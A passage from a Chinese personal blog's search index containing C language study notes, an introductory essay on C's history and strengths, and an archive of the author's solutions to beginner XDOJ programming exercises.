a,b,c; 其中，只有a是指向int的指针类型。b和c都是整数类型。所以，宏指令并不能很好地处理指针类型。因此我们通常会用typedef取而代之。 转义符这是转义字符\\。注意，对于printf()而言，未定义的转义字符会直接输出反斜杠后的字符。 另外，有一种三符号系统，用\\??*来表示其他符号。所以连续使用问号时请务必注意。 单引号，双引号在很多语言中，单引号和双引号是等效的（比如Python）。但是对于C语言而言，单引号内只能表示单个字符，而双引号只能表示字符串。 奇怪的赋值2来看看这个。 1r=s+(t=u-v)/3; 这个表达式合法吗？合法。因为C语言中，赋值并不是语句，而是表达式。所以它可以出现在任何允许出现的地方。 既然是表达式，那么它就有返回值。 赋值表达式的值就是左操作数的新值。 再来看看这个语句。 12int a;(a=4)=3*4; 合法吗？不合法。括号项是表达式，它作为另一个赋值表达式的左值参与赋值运算。但是左值不能是常量，而(a=4)的值是4，显然不能被赋值。 逗号运算符逗号运算符将几个表达式相连接，构成一个表达式。这个表达式的值就是最右边的子表达式的值。 在这里有一个小技巧： 123while(expression1) statement1,statement2; 事实上这两条语句都会循环运行。此处的逗号运算符将两条语句合并成一条语句。 除了这里可以这么用，可以在循环条件中这么写：如果这么做能使程序更优秀的话。 for语句C的for是while的一种常用语句组合形式的简写法。语法如下所示： 12for(expression1; expression2; expression3) statement; 其中statement称为循环体。expression1为初始化部分，只在循环开始时执行一次。expression2称为条件部分，它在循环体每次执行前都要执行一次，和while语句中的表达式一样。expression3称为调整部分，它在循环体每次执行完毕，在条件部分即将执行前执行。 这三个表达式都是可省略的。若省略条件部分，表示测试的值始终为真。 表达式和语句表达式可以出现在任何地方，而语句只能出现在单独的一行。C语言没有赋值语句，它只有赋值表达式。 所以嘛，表达式能出现的地方，都可以赋值，这就有了上面那个奇怪的赋值2。 代码块与声明我们知道，变量是有作用域的。也就是说，它可以声明在最外层，或者是代码块开头。其实，函数的声明也一样。看看这个： 123456789101112131415#include &lt;stdio.h&gt;int main(void){ int square(int a) { return a*a; } int num; scanf(&quot;%d&quot;,&amp;num); printf(&quot;%d&quot;,square(num)); return 0;} 一样，它也可以使用函数原型。只需要在前面声明函数原型，在之后写上函数实现就行。不过，以这种形式只能在这个语句块中使用。所以，我们可以随便套娃我们可以声明任意多重的函数。不过注意作用域问题：内层声明会在当前语句块内覆盖重名的外层声明。 另外还有，关于代码块，它并非必须和for等一起出现。它也可以单独出现。和一起出现时一样，它形成了一个块作用域，可以划定更精细的作用域和生命周期。 关于main()函数 其实它真的和其他函数一样是平等的。编译器编译时并没有区别对待它，但是连接器在链接过程，会将一个中间文件链接过来，那个文件指明了程序的入口点：main()。程序只是从main()开始执行，仅此而已。既然如此，那么其他函数的操作，在main()函数，也可以使用了。比如递归（虽然这种用法极度罕见），被别的函数调用等各种操作。 可变参数列表的函数需要用宏来实现。这些宏位于stdargs.h头文件，是C标准库的一部分。 123456789101112131415#include &lt;stdarg.h&gt;float avarage(int n_values, ...){ va_list var_arg; int count; float sum=0; va_start(var_arg, n_values); for(count=0;count&lt;n_values;count++) sum+=va_arg(var_arg, int); va_end(var_arg); return sum/n_values;} 灵活性123456789101112switch(cond) { do{ case 1: i++; case 2: i++; case 3: i++; case 4: i++; case 5: i++; case 6: i++; case 7: i++; } while(cond2);} 没啥技巧，就是反映了C实现的灵活性。原作者为了减少转移次数来优化性能，就整了这么个写法来增加一次跳转后执行的指令数，同时借助switch控制非整数量来对齐结果。最重要的是，这用法反应了编译器/C标准对switch这个语法结构的描述，以及对于程序执行流控制的方式。","link":"/2021/09/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%9D%82%E8%AE%B0/"},{"title":"C语言编程二三事","text":"作为计算机界长久不衰的编程语言，C语言到底有什么独到的优势呢？ 如果想学习，那么学习路线是什么呢？ 学会了之后，能写出些什么程序呢？ 这些，就是本文想要告诉你的。 C语言的起源1972年，贝尔实验室的丹尼斯·里奇（Dannis Ritch）和肯·汤普逊（Ken Thomson）在开发UNIX操作系统时设计了C语言。然而，C语言并不完全是里奇突发奇想而来，他是在B语言（汤普逊发明）的基础上进行设计。C语言的设计初衷是将其作为程序员使用的一种编程工具，因此，其主要目标是成为有用的语言。 各个编程语言的侧重点都不完全相同。例如，Pascal语言的主要目标是为更好地学习编程原理提供扎实的基础；而BASIC的主要目标是开发出类似英文的语言，让不熟悉计算机的学生轻松学习编程。这些目标固然很重要，但是随着计算机的迅猛发展，他们已经不再是主流语言。然而，最初为程序员设计开发的C语言，现在已成为首选的编程语言之一。 为什么是C语言在过去的50多年里，C语言已经成长为最重要、最流行的编程语言之一。它的成长归功于用过它的人都对它很满意。虽然现在很多人都转而使用其他编程语言，但是C语言仍凭借自身实力从众多编程语言中脱颖而出。尤其是在一些特殊场合（如嵌入式开发，操作系统底层的编写等）C语言更是有着无可替代的地位。以下列出了C语言较为突出的几点优势。 高效性在设计上，C语言充分利用了当前计算机的优势，因此C程序相对更紧凑，而且运行速度很快。实际上，C语言具有通常是汇编语言才具有的微调控制能力，可以根据具体情况微调程序以获得最大运行速度或最有效地使用内存（顺便一提，绝大多数情况下，C++都可以看作C的超集，而C的运行速度通常要快于C++）。 可移植性C是可移植的语言。对于一个编程语言来讲，移植可能是最麻烦的事情。C语言是可移植方面的佼佼者。从你的电子表到超级计算机，许多计算机的体系结构都可以使用C编译器（一种把C语言转换成计算机内部指令的程序）。但是要注意，程序中针对特殊硬件设备或操作系统特殊功能编写的部分，通常是不可移植的。 强大而灵活C语言功能强大而灵活。例如，大家最为所熟知的Windows7操作系统，其内核的绝大部分都是由C语言完成的，剩下的则是由汇编语言完成的。不仅如此，其他语言的许多编译器和解释器都是用C语言编写的。C程序可以用于解决物理学和工程学的问题，甚至可用于制作电影的动画特效。 面向程序员程序员利用C可以访问硬件、操控内存中的位。C语言有丰富的运算符，能让程序员简洁地表达自己的意图。C没有Pascal严谨，但是却比C++的限制多。这样的灵活性既是优点也是缺点。优点是，许多任务用C来处理都非常简洁（如，转换数据的格式）；缺点是，你可能会犯一些莫名其妙的错误，这些错误不可能在其他语言中出现。C语言在提供更多自由的同时，也让使用者承担了更大的责任。 另外，大多数C实现都有一个大型的库，包含众多有用的C函数。这些函数用于处理程序员经常需要解决的问题。 缺点当然，人无完人，金无足赤。C语言也有一些缺点。例如前面提到的，要享受用C语言自由编程的乐趣，就必须承担更多的责任。特别是，C语言使用指针，而涉及指针的编程错误往往难以察觉。有句话说得好：想拥有自由就必须时刻保持警惕。 关于C语言，还有一项比赛，是只为C语言举办过的：年度混乱代码大赛。这正是因为C语言紧凑简洁，结合了大量的运算符，以至于我们也可以编写出让人极其费解的代码。虽然没必要但是试试也无妨。 瑕不掩瑜，C语言的优点比缺点多得多。 如何学习编程语言的学习，其实和语言（比如英语，汉语）的学习是类似的。因此，大家不要有畏难心理。但后者比前者快得多（毕竟前者在“语法”和“词汇”上比后者少得多）。我的建议是：阅读C语言的教材，并且多加练习和思考，不会的问题多百度（这尤其重要，当然如果你能用谷歌更好）。当然，也可以通过这套教程快速掌握一部分基础知识（如果我不咕咕咕的话）。另外，网易云课堂和中国大学MOOC也是非常值得推荐的学习平台。 C语言能干什么？除了不能生孩子什么都能干。当然，难度是不一样的。比如，如果你想让电脑显示一些文字的话，最多也只需要7行；如果想自己制作一些游戏的话（什么2048啊，俄罗斯方块啊，贪吃蛇啊），要写的可就不止那么几行了（大触请绕行）。我曾经自己动手写过一个俄罗斯方块，大概1000多行代码（现在想想还能精简掉好多）。我甚至还用C语言解决过一个WER工程挑战赛任务（虽然最后那个任务突然被取消了……），算上图形界面，大概3、400行代码。所以，C语言能干什么，完全取决于你的学习深度。可以说，学得越深，能干的事就越多。 毕竟，很多领域和C语言都是紧密相连的。比如单片机，比如操作系统开发，比如嵌入式开发（就像电脑显示器，微波炉等），比如计算机病毒（这个嘛……前面也说到了，C语言是最接近系统底层的编程语言）。在这些领域都能或多或少看到C语言的影子。 总而言之，C语言是非常重要的编程语言。掌握了它，你就获得了一件屠龙宝刀。因此，加油学吧！反正现在不学大学也得学 愿你能用C语言写出你心中最美的天地。","link":"/2020/12/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E4%BA%8C%E4%B8%89%E4%BA%8B/"},{"title":"XDOJ-archive","text":"更新：这么翻着看太麻烦了，做了个小工具，这里就先不更新了。 点击前往 听说XDOJ上的题有200多道，刷的题在这记下，以后备用。 过于简单的就直接放代码了。 不知道哪找的题，题解写这了 1.数列分段问题描述给定一个整数数列，数列中连续相同的最长整数序列算成一段，问数列中共有多少段？ 输入格式输入的第一行包含一个整数n，表示数列中整数的个数。 第二行包含n个整数a1, a2, …, an，表示给定的数列，相邻的整数之间用一个空格分隔。 输出格式输出一个整数，表示给定的数列有多个段。 样例输入1288 8 8 0 12 12 8 0 样例输出15 题解12345678910111213141516171819202122232425/* array_count.c - by xeonds - 2021.10.15 23:00 */#include &lt;stdio.h&gt;int main(void){ int i,j,num_curr,num_prev,count; scanf(&quot;%d&quot;,&amp;i); for(j=0,count=1;j&lt;i;j++) { if(j==0) { scanf(&quot;%d&quot;,&amp;num_prev); continue; } scanf(&quot;%d&quot;,&amp;num_curr); if(num_curr!=num_prev) count++; num_prev=num_curr; } printf(&quot;%d&quot;,count); return 0;} 没来得及提交，不知道能不能过（反正本地gcc运行是没问题的。但是OJ平台好像是VC6（叹更新：已经找到题了，过了（ 第一次上机的练习题。大多数都很简单，除了一个隐式转换的坑。 2.A+B+C1234567891011#include &lt;stdio.h&gt;int main(void){ int a,b,c; scanf(&quot;%d %d %d&quot;,&amp;a,&amp;b,&amp;c); printf(&quot;%d&quot;,a+b+c); return 0;} 3.求三角形面积123456789101112131415/* calc triangle area - by xeonds */#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main(void){ float a,b,c,p; scanf(&quot;%f %f %f&quot;,&amp;a,&amp;b,&amp;c); p=(a+b+c)/2; printf(&quot;%.2f&quot;,sqrt(p*(p-a)*(p-b)*(p-c))); return 0;} 4.整数简单运算1234567891011#include &lt;stdio.h&gt;int main(void){ int a,b; scanf(&quot;%d %d&quot;,&amp;a, &amp;b); printf(&quot;%d\\n%d\\n%d\\n%d\\n&quot;,a+b,a-b,a*b,a/b); return 0;} 5.字符输入输出这里注意下，字母大小写转换可以用ascii码的方式进行，也可以用二进制格式按位操作的方式完成。 12345678910111213141516#include &lt;stdio.h&gt;int main(void){ int ch; for(int i=0;i&lt;9;i++) { ch=getchar(); if(i%2==0) putchar(ch+32); } printf(&quot;!&quot;); return 0;} 6.计算长方体体积注意，转换说明要和数据类型匹配。 1234567891011#include &lt;stdio.h&gt;int main(void){ float a,b,c; scanf(&quot;%f %f %f&quot;,&amp;a,&amp;b,&amp;c); printf(&quot;%.3f&quot;,a*b*c); return 0;} 7.数字字符这里不能用减的原因是，减有可能会产生负数，这在ascii码体系中是未定义的。 12345678910111213/* int add char - by xeonds */#include &lt;stdio.h&gt;int main(void){ int a,ch; scanf(&quot;%d,%d&quot;,&amp;a,&amp;ch); printf(&quot;%d,%d&quot;,a+ch+48,a+ch); return 0;} 8.计算球体重量1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#define PI 3.1415926#define FE 7.86#define AG 19.3float mass(int a,float p);int main(void){ int d_1,d_2; scanf(&quot;%d %d&quot;,&amp;d_1,&amp;d_2); printf(&quot;%.3f %.3f&quot;,mass(d_1,FE),mass(d_2,AG)); return 0;}float mass(int a, float p){ float m; m = 4*PI*a*a*a*p/3/1000/8; return m;} 9.整除判断11234567891011121314#include &lt;stdio.h&gt;int main(void){ int a,b; scanf(&quot;%d %d&quot;,&amp;a,&amp;b); if(a%b==0) printf(&quot;yes&quot;); else printf(&quot;%d %d&quot;,a/b,a%b); return 0;} 10.求三位整数各位之和本来是想写得更通用一些，但是任务太简单，没必要。 1234567891011#include &lt;stdio.h&gt;int main(void){ int i; scanf(&quot;%d&quot;,&amp;i); printf(&quot;%d&quot;,i%10+(i%100-i%10)/10+(i-i%100)/100); return 0;} 更通用一点的算法：任意位（不超过int范围）各位求和： 12345678910111213141516171819202122/* calc_bit_sum.c -by xeonds - 2021.10.16 15:11 */#include &lt;stdio.h&gt;int calc(int num);int main(void){ int num; scanf(&quot;%d&quot;, &amp;num); printf(&quot;%d&quot;, calc(num)); return 0;}int calc(int num){ if (num &gt;= 10) return num % 10 + calc((num - num % 10) / 10); else return num;} 11.温度转换这有个坑，好多人都掉进来了：数据的隐式转换。赋值表达式右值的数据类型会自动转换成其中容纳范围最大的项的数据类型。 比如，c=1+3/2的结果是2，而c=1+3/2.0的结果是2.50。 123456789101112131415161718192021222324/* temperature convert - by xeonds */#include &lt;stdio.h&gt;float f_to_c(int a);int main(void){ int f; scanf(&quot;%d&quot;,&amp;f); printf(&quot;%.2f&quot;,f_to_c(f)); return 0;}float f_to_c(int a){ float c; c = (a-32.00)*5.00/9.00; return c;} 第二次上机练习的题，都很简单。注意下文档编码问题，包含中文的最好用GB2312编码 12.四则运算输入二元表达式，进行运算。初中写过一个计算器，比这个复杂些。 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int calc(int a, int b, char calc);int main(void){ int num_1, num_2; char ch; scanf(&quot;%d%c%d&quot;, &amp;num_1, &amp;ch, &amp;num_2); printf(&quot;%d%c%d=%d&quot;, num_1, ch, num_2, calc(num_1, num_2, ch)); return 0;}int calc(int a, int b, char calc){ switch (calc) { case '+': return a + b; case '-': return a - b; case '*': return a * b; case '/': return a / b; case '%': return a % b; }} 注意，C语言中整数的除法结果都是带余除法，取余运算是%，是二元运算符，只接受整数作为运算对象。 13.数位输出输出数字的各位。相当于给各位间加了个空格。这里用的是数学办法。 12345678910111213141516171819#include &lt;stdio.h&gt;int main(void){ int a, i; scanf(&quot;%d&quot;, &amp;a); for (i = 1; a &gt;= i; i *= 10) ; i /= 10; for (; a &gt; 0;) { printf(&quot;%d &quot;, a / i); a -= a / i * i; i /= 10; } return 0;} 注意空语句。它只有一个符号;，但是是一个完整的语句。 14.冰箱温度预测很简单。注意将数据类型隐式转换为浮点数即可。 12345678910111213/* 2.3 温度计算 - by xeonds */#include &lt;stdio.h&gt;int main(void){ int h, m; scanf(&quot;%d %d&quot;, &amp;h, &amp;m); printf(&quot;%.2f\\n&quot;, 4.0 * (h + m / 60.0) * (h + m / 60.0) / ((h + m / 60.0) + 2) - 20); return 0;} 15.除法计算器怎么又是小明（(╯‵□′)╯︵┻━┻） 1234567891011121314#include &lt;stdio.h&gt;int main(void){ int m, n, q, r; scanf(&quot;%d %d %d %d&quot;, &amp;m, &amp;n, &amp;q, &amp;r); if (m / n == q &amp;&amp; m % n == r) printf(&quot;yes&quot;); else printf(&quot;%d %d&quot;, m / n, m % n); return 0;} 16.简单程序123456789#include &lt;stdio.h&gt;int main(void){ puts(&quot;C programming language is useful!&quot;); puts(&quot;I like it very much.&quot;); return 0;} 17.求平均值注意隐式转换。 1234567891011#include &lt;stdio.h&gt;int main(void){ int a, b, c; scanf(&quot;%d %d %d&quot;, &amp;a, &amp;b, &amp;c); printf(&quot;%.2f&quot;, (a + b + c) / 3.0); return 0;} 18.计算球的体积1234567891011#include &lt;stdio.h&gt;int main(void){ float r; scanf(&quot;%f&quot;, &amp;r); printf(&quot;%.2f&quot;, 4 * 3.14 * r * r * r / 3); return 0;} 19.工资发放下面的程序可以抽象成函数来简化。 待会写（咕 1234567891011121314151617181920212223#include &lt;stdio.h&gt;int main(void){ int salary, m100 = 0, m50 = 0, m20 = 0, m10 = 0, m5 = 0, m1 = 0; scanf(&quot;%d&quot;, &amp;salary); if (salary &gt;= 100) m100 = salary / 100, salary = salary % 100; if (salary &gt;= 50) m50 = salary / 50, salary = salary % 50; if (salary &gt;= 20) m20 = salary / 20, salary = salary % 20; if (salary &gt;= 10) m10 = salary / 10, salary = salary % 10; if (salary &gt;= 5) m5 = salary / 5, salary = salary % 5; if (salary &gt;= 1) m1 = salary / 1; printf(&quot;%d %d %d %d %d %d&quot;, m100, m50, m20, m10, m5, m1); return 0;} 写出来之后感觉完全没有简化（笑） 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int *m_calc(int m_size, int salary);int main(void){ int salary; scanf(&quot;%d&quot;, &amp;salary); printf(&quot;%d %d %d %d %d %d&quot;, m_calc(100, salary)[0], m_calc(50, m_calc(100, salary)[1])[0], m_calc(20, m_calc(50, m_calc(100, salary)[1])[1])[0], m_calc(10, m_calc(20, m_calc(50, m_calc(100, salary)[1])[1])[1])[0], m_calc(5, m_calc(10, m_calc(20, m_calc(50, m_calc(100, salary)[1])[1])[1])[1])[0], m_calc(1, m_calc(5, m_calc(10, m_calc(20, m_calc(50, m_calc(100, salary)[1])[1])[1])[1])[1])[0]); return 0;}int *m_calc(int m_size, int salary){ int *res; res = (int *)malloc(sizeof(int) * 2); res[0] = salary / m_size; //number of money res[1] = salary % m_size; //rest of salary return res;} 20.三角形判别1234567891011121314#include &lt;stdio.h&gt;int main(void){ int a, b, c; scanf(&quot;%d %d %d&quot;, &amp;a, &amp;b, &amp;c); if (a + b &gt; c &amp;&amp; a + c &gt; b &amp;&amp; b + c &gt; a) printf(&quot;%d&quot;, a + b + c); else printf(&quot;No&quot;); return 0;} 判断部分可以用三目运算符简化成这样： 1(a + b &gt; c &amp;&amp; a + c &gt; b &amp;&amp; b + c &gt; a)?printf(&quot;%d&quot;, a + b + c):printf(&quot;No&quot;); 21.判断奇偶性utf-8大法好，gb2312太谔谔了（ψ(｀^´)ψ 1234567891011121314151617//encoding: GB2312#include &lt;stdio.h&gt;int main(void){ int a; scanf(&quot;%d&quot;, &amp;a); if (a &gt; 0) if (a % 2 == 1) printf(&quot;奇数&quot;); else printf(&quot;偶数&quot;); return 0;} 22.整除判断21234567891011121314#include &lt;stdio.h&gt;int main(void){ int num; scanf(&quot;%d&quot;,&amp;num); if(num%35==0) printf(&quot;yes&quot;); else printf(&quot;no&quot;); return 0;} 23.出租车计价注意四舍五入的技巧： 12float num=5.4;(int)(num+0.5); //四舍五入 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;float calc(float s,int t);int main(void){ float s; int t; scanf(&quot;%f %d&quot;,&amp;s,&amp;t); printf(&quot;%d&quot;,(int)(calc(s,t)+0.5)); return 0;}float calc(float s,int t){ float res=0; res=t/5*2; if(s&gt;10) res+=24+3*(s-10); else if(s&gt;3) res+=10+2*(s-3); else if(s&gt;0) res+=10; return res;} 24.利率计算1234567891011121314#include &lt;stdio.h&gt;int main(void){ float r,p=1; int n; scanf(&quot;%f %d&quot;,&amp;r,&amp;n); for(;n&gt;0;n--) p*=1+r; printf(&quot;%.2f&quot;,p); return 0;} 25.购房贷款计算 纯粹拿来恶心人的（虽然确实有实际应用背景 12345678910111213#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main(void){ float month=0,d,p,r; scanf(&quot;%f %f %f&quot;,&amp;d,&amp;p,&amp;r); month=log10((double)(p/(p-d*r)))/log10(1+(double)r); printf(&quot;%.2f&quot;,month); return 0;} 26.字符加密正经解法： 1234567891011#include &lt;stdio.h&gt;int main(void){ int ch[5] = &quot;China&quot;, i; for (i = 0; i &lt; 5; i++) putchar(ch[i] + 4); return 0;} 不正经解法（大家别学我）： 12345678#include &lt;stdio.h&gt;int main(void){ printf(&quot;Glmre&quot;); return 0;} 其实这就是crypto（密码学）中的凯撒密码。 27.课堂练习题-沸水降温曲线1234567891011121314151617181920#include &lt;stdio.h&gt;int main(void){ int m,s; float t; scanf(&quot;%d %d&quot;,&amp;m,&amp;s); t=m+s/60.0; if(t&gt;50) printf(&quot;%.1f&quot;,20.0); else if(t&gt;30) printf(&quot;%.1f&quot;,30-(t-30)/2); else if(t&gt;10) printf(&quot;%.1f&quot;,50-(t-10)); else if(t&gt;=0) printf(&quot;%.1f&quot;,100-5*t); return 0;} 第三次上机的题（不过标的是2？）难度很简单，唯一的问题是我没睡醒《关于我8:00-12:00上机，我11:30醒这件事》 1.数列分段这下我终于知道那个第一题是哪来的了（ 还请跳到第一题（ 为了保持序号数值和xdoj题数一样，此处序号就用1了 28.最小差值因为任意两个数都得作差，所以偷了个懒，用malloc把输入存到一个数组里了。 其实malloc完后，和数组的用法就差不多了。 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void) { int i, j, res, a, *arr; scanf(&quot;%d&quot;, &amp;a); arr = (int *)malloc(sizeof(int) * a); for (i = 0; i &lt; a; i++) { scanf(&quot;%d&quot;, &amp;arr[i]); } for (i = 0; i &lt; a - 1; i++) for (j = i + 1; j &lt; a; j++) if (i == 0 &amp;&amp; j == 1) res = arr[i] - arr[j] &lt; 0 ? arr[j] - arr[i] : arr[i] - arr[j]; else { if (res &gt; (arr[i] - arr[j] &lt; 0 ? arr[j] - arr[i] : arr[i] - arr[j])) res = (arr[i] - arr[j] &lt; 0 ? arr[j] - arr[i] : arr[i] - arr[j]); } printf(&quot;%d&quot;, res); return 0;} 29.车牌限行_分支结构看到群里有人在if里套了switch。其实没必要，限行的号码都是很有规律的。 123456789101112131415161718192021#include &lt;stdio.h&gt;int main(void) { int a, b, c; scanf(&quot;%d %d %d&quot;, &amp;a, &amp;b, &amp;c); if (a &gt; 5 || b &lt; 200) printf(&quot;%d no&quot;, c % 10); else if (b &lt; 400) if (c % 5 == a % 5) printf(&quot;%d yes&quot;, c % 10); else printf(&quot;%d no&quot;, c % 10); else if (b &gt;= 400) if (c % 2 == a % 2) printf(&quot;%d yes&quot;, c % 10); else printf(&quot;%d no&quot;, c % 10); return 0;} 另外可别学我if和else不加括号，初学的话很容易弄不清else是属于哪个else的。对于这个，知道else属于最近的if就行。 30.计算某月天数_分支结构这里有个switch的小技巧：case语句可以通过不加break来合并。 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;int calc(int y, int m) { switch (m) { case 1: case 3: case 5: case 7: case 8: case 10: case 12: return 31; case 4: case 6: case 9: case 11: return 30; case 2: return (y % 4 == 0 &amp;&amp; y % 100 != 0) || y % 400 == 0 ? 29 : 28; }}int main(void) { int a, b; scanf(&quot;%d %d&quot;, &amp;a, &amp;b); printf(&quot;%d&quot;, calc(a, b)); return 0;} 31.计算整数各位数字之和正好就是上面写的通用方法（ 请上翻到10的通用写法。 所以说嘛，多想一点总是没错的。 32.最大公约数12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;int gcd(int a, int b) { int res = 0, i; if (a &gt; b) { i = a; a = b; b = i; } if (a == 0) return b; for (i = 1; i &lt;= a; i++) if (a % i == 0 &amp;&amp; b % i == 0) res = i; return res;}int main(void) { int a, b; scanf(&quot;%d %d&quot;, &amp;a, &amp;b); if (a &gt;= 0 &amp;&amp; b &lt; 10000) printf(&quot;%d&quot;, gcd(a, b)); return 0;} 本来是想用 1i=a,a=b,b=i; 来做a和b值的交换的，但是平台上那个hmp编译器好像不支持逗号运算符？ 还是我搞错编译器了呢？（笑） 33.角谷定理123456789101112131415#include &lt;stdio.h&gt;int main(void) { int a, i; scanf(&quot;%d&quot;, &amp;a); for (i = 0; a != 1; i++) if (a % 2 == 0) a /= 2; else a = (a *= 3) + 1; printf(&quot;%d&quot;, i); return 0;} 34.PM2.512345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;int main(void) { int res[6] = {0, 0, 0, 0, 0, 0}, data, a, i, sum; scanf(&quot;%d&quot;, &amp;a); for (i = 0, sum = 0; i &lt; a; i++) { scanf(&quot;%d&quot;, &amp;data); if (data &gt; 300) res[5]++; else if (data &gt; 200) res[4]++; else if (data &gt; 150) res[3]++; else if (data &gt; 100) res[2]++; else if (data &gt; 50) res[1]++; else if (data &gt;= 0) res[0]++; sum += data; } printf(&quot;%.2f\\n&quot;, (float)sum / a); for (i = 0; i &lt; 6; i++) printf(&quot;%d &quot;, res[i]); return 0;} 35.气温波动注意，是相邻两天波动的绝对值最大值，而不是所有天温度的最大值减去最小值。 这里的prev和curr表示上一个和当前的，是写链表的习惯。 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main(void) { int curr, prev, res, a, i, tmp; scanf(&quot;%d&quot;, &amp;a); if (a &gt;= 2 &amp;&amp; a &lt;= 30) { for (i = 0, res = 0; i &lt; a; i++) { if (i == 0) { scanf(&quot;%d&quot;, &amp;prev); continue; } scanf(&quot;%d&quot;, &amp;curr); if (abs(curr - prev) &gt; res) res = abs(curr - prev); prev = curr; } printf(&quot;%d&quot;, res); } return 0;} 36.完全平方数前面有个同学问到过这个。需要注意，==的使用前提是两边的数据类型相同，所以可以这么写： 12if (sqrt(a) - (int)sqrt(a) == 0) statement; 而不能这么写： 12if (sqrt(a) == (int)sqrt(a)) statement; 1234567891011121314#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main(void) { int a; scanf(&quot;%d&quot;, &amp;a); if (sqrt(a) - (int)sqrt(a) == 0) printf(&quot;%d&quot;, (int)sqrt(a)); else printf(&quot;no&quot;); return 0;} 37.选号程序做这题的时候又犯迷糊了。。其实只需要相邻两数依次比较就行。第一回做的时候直接来了个O(n!)的比较，纯属没睡醒。 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;int calc(int num);int main(void) { int a, i, data, res; scanf(&quot;%d&quot;, &amp;a); for (i = 0; i &lt; a; i++) { if (i == 0) { scanf(&quot;%d&quot;, &amp;res); continue; } scanf(&quot;%d&quot;, &amp;data); if (calc(res) &lt; calc(data)) res = data; else if (calc(res) == calc(data)) res = res &gt; data ? res : data; } printf(&quot;%d&quot;, res); return 0;}int calc(int num) { if (num &gt;= 10) return num % 10 + calc((num - num % 10) / 10); else return num;} 38.自然数分解其实好多时候都没有用函数的必要，除了必须递归的算法。 大多数时候，我这么用，只是用了自己总结的模板而已：大多数题都是输入数，经过处理再输出数。 重复的部分我是懒得再敲一遍的。 12345678910111213141516#include &lt;stdio.h&gt;int calc(int a, int i) { return 2 * i - (a + 1);}int main(void) { int a, i; scanf(&quot;%d&quot;, &amp;a); if (a &gt; 0 &amp;&amp; a &lt; 30) for (i = 1; i &lt; a + 1; i++) printf(&quot;%d &quot;, a * a + calc(a, i)); return 0;} 39.日期计算怎么说呢，难度简单，就是做的有些晕。 果然下次还是得睡好啊（叹）。 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;int main(void) { int y, m, d, n, n0, i, arr_n[12] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}, arr_o[12] = {31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}; scanf(&quot;%d %d&quot;, &amp;y, &amp;n); if (y % 4 == 0 &amp;&amp; y % 100 != 0 || y % 400 == 0) { for (m = 1; m &lt;= 12; m++) { for (i = 0, n0 = 0; i &lt; m; i++) n0 += arr_o[i]; if (n &lt;= n0) { for (i = 0, n0 = 0; i &lt; m - 1; i++) n0 += arr_o[i]; d = n - n0; break; } } } else { for (m = 1; m &lt;= 12; m++) { for (n0 = 0, i = 0; i &lt; m; i++) n0 += arr_n[i]; if (n &lt;= n0) { for (n0 = 0, i = 0; i &lt; m - 1; i++) n0 += arr_n[i]; d = n - n0; break; } } } printf(&quot;%d %d&quot;, m, d); return 0;} 40.跳一跳有个坑：第一个值为2的话，如果没初始化flag=0的话就会出错。 给未初始化的值自增肯定有问题啊。 1234567891011121314151617#include &lt;stdio.h&gt;int main(void) { int a, res = 0, flag=0; while (scanf(&quot;%d&quot;, &amp;a) &amp;&amp; a != 0) if (a == 1) { res++; flag = 0; } else if (a == 2) { flag++; res += 2 * flag; } printf(&quot;%d&quot;, res); return 0;} 41.累加和校验md，搞了半天，原来是输入得用EOF结束。我就说看错误列表里全是time out，原来oj上输入的终止符是EOF。刚开始用的'\\n'，难怪过不了。 12345678910111213#include &lt;stdio.h&gt;int main(void){ char ch; int res = 0; while ((ch = getchar()) != EOF) res += ch; printf(&quot;%d\\n&quot;, res % 256); return 0;} 第四次上机题很简单，不用想，但是写起来挺费时间待会再写分析 42.阶梯电价1_分支结构浪费时间。 1234567891011121314151617#include &lt;stdio.h&gt;int main(void) { double a, res; scanf(&quot;%lf&quot;, &amp;a); if (a &gt; 210) { res = (a - 210) * 0.70 + 110; } else if (a &gt; 110) { res = (a - 110) * 0.55 + 55; } else if (a &gt;= 0) { res = a * 0.5; } printf(&quot;%.2lf&quot;, res); return 0;} 43.完数1234567891011121314151617181920212223#include &lt;stdio.h&gt;int is_ok_num(int num);int main(void) { int i, a, b; scanf(&quot;%d %d&quot;, &amp;a, &amp;b); for (i = a; i &lt;= b; i++) if (is_ok_num(i)) printf(&quot;%d\\n&quot;, i); return 0;}int is_ok_num(int num) { int i, add; for (i = 1, add = 0; i &lt; num; i++) add += (num % i == 0 ? i : 0); return num == add ? 1 : 0;} 44.整数分析12345678910111213141516171819#include &lt;stdio.h&gt;int main(void) { int a, max, min, bit; scanf(&quot;%d&quot;, &amp;a); max = min = a % 10; bit = a == 0 ? 1 : 0; while (a != 0) { int c = a % 10; max = max &gt;= c ? max : c; min = min &lt;= c ? min : c; a = (a -= a % 10) / 10; bit++; } printf(&quot;%d %d %d\\n&quot;, bit, max, min); return 0;} 45.折点计数12345678910111213141516171819202122#include &lt;stdio.h&gt;int main(void) { int a, i, curr, prev, next, count; scanf(&quot;%d&quot;, &amp;a); for (i = 1, count = 0; i &lt; a - 1; i++) if (i == 1) { 